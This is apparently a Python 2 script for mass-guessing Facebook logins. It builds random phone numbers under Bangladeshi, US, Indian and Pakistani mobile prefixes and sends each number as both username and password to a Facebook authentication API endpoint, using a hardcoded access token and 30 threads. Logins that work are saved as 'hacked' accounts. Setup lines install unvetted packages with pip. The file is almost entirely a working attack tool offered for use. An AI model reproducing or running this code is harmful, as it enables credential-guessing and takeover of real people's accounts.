#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BT141
#If You BT141 Take Credits For This Code, Please Look Yourself Again...
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1000):
 
    nmbr = random.randint(11111111, 99999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 R.K.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 

def t():
    time.sleep(1)
def cb():
    os.system('clear')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
##### LOGO #####
logo='''
                     
 ███████████ █████ █████████ ███████████
░░███░░░░░██░░███ ███░░░░░██░█░░░░░░███ 
 ░███    ░███░███░███    ░██░     ███░  
 ░██████████ ░███░███████████    ███    
 ░███░░░░░███░███░███░░░░░███   ███     
 ░███    ░███░███░███    ░███ ████     █
 █████   █████████████   ███████████████
░░░░░   ░░░░░░░░░░░░░   ░░░░░░░░░░░░░░░ 
                       
\033[1;31;40--------------------------------------------------    
|  >>>>>>\033[2;37;40mðRIAZKHAN CYBER SECURITY TEAMð°<<<<<  |
\033[1;31;40--------------------------------------------------
â£ Coded by   : RIAZKHAN
â£ GitHub     : https://github.com/Riazkiller
â£ Made with  : RIAZKHAN CYBER SECURITY TEAM
â£ Pre help   : R_____K
--------------------------------------------------
                                '''
os.system('clear')
print (logo)

CorrectUsername = "RK"
CorrectPassword = "RK"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[ð] \x1b[1;97mTool USERNAME \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[ð] \x1b[1;97mTool PASWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "\033[1;91mWrong!,\033[1;92mjoin our fb page to get the correct password"
            os.system('xdg-open https://www.facebook.com/Riaz-hacker-100835532473815/')

    else:
        print "\033[0;37;41mWrong!,\033[0;37;41mjoin our fb page to get the correct username"
        

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print("\033[0;37;41m[1]  Grameenphone 017")
	print("\033[0;37;42m[2]  Grameenphone 013")
	print("\033[0;37;44m[3]  Banglalink 019")
	print("\033[0;42;41m[4]  Banglalink 014")
	print("\033[0;42;42m[5]  Robi")
	print("\033[0;42;44m[6]  Teletalk")
	print("\033[0;42;41m[7]  Airtel")
	print("\033[0;42;42m[8]  Usa")
	print("\033[0;42;44m[9]  Indian")
	print("\033[0;42;41m[10] Pakistan")
	print("\033[0;42;42m[11] UPDATE COMMAND")
	print("\033[0;42;40m[0]  Exit")
	print 50*'-'
	action()
 
 
def action():
	bch = raw_input('\n Select oneââ¤ ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		try:
			c = raw_input(" choose code  : ")
			k="+88017"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":
		os.system("clear")
		print (logo)
		print("786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input(" choose code  : ")
			k="+88013"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":
		os.system("clear")
		print (logo)
		print("737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" choose code  : ")
			k="+88019"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="4":
		os.system("clear")
		print (logo)
		print("954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" choose code  : ")
			k="+88014"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
	
		menu()
	elif bch =="5":
		os.system("clear")
		print (logo)
		print("127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input(" choose code  : ")
			k="+88018"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
		os.system("clear")
		print (logo)
		print("11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input(" choose code  : ")
			k="+88015"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="7":
		os.system("clear")
		print (logo)
		print("1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input(" choose code  : ")
			k="+88016"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="8":
		os.system("clear")
		print (logo)
		print("388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input(" choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="9": 
		os.system("clear")
		print (logo)
		print("60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input(" choose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="10": 
		os.system("clear")
		print (logo)
		print("00, 01, 03, 30, 33, 34, 44, 34, 35")
		try:
			c = raw_input(" choose code  : ")
			k="+92"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="11":
	    os.system("clear")
	    os.system("pip2 install --upgrade balln")
	    os.system("pip2 install --upgrade balln")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 R.k.py")
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ('[ð¤] Total Numbers: 99744965')
	time.sleep(0.5)
	psb ('[ð§] Please wait,  RIAZKHAN finding accounts ...')
	time.sleep(0.5)
	psb ('[!] To Stop Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[RK Hacked]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '[RK CP] ' + k + c + user + ' | ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[â] Process Has Been Completed ....'
	print '[â] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[â] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 R.K.py')
		
if __name__ == '__main__':
	menu()
 
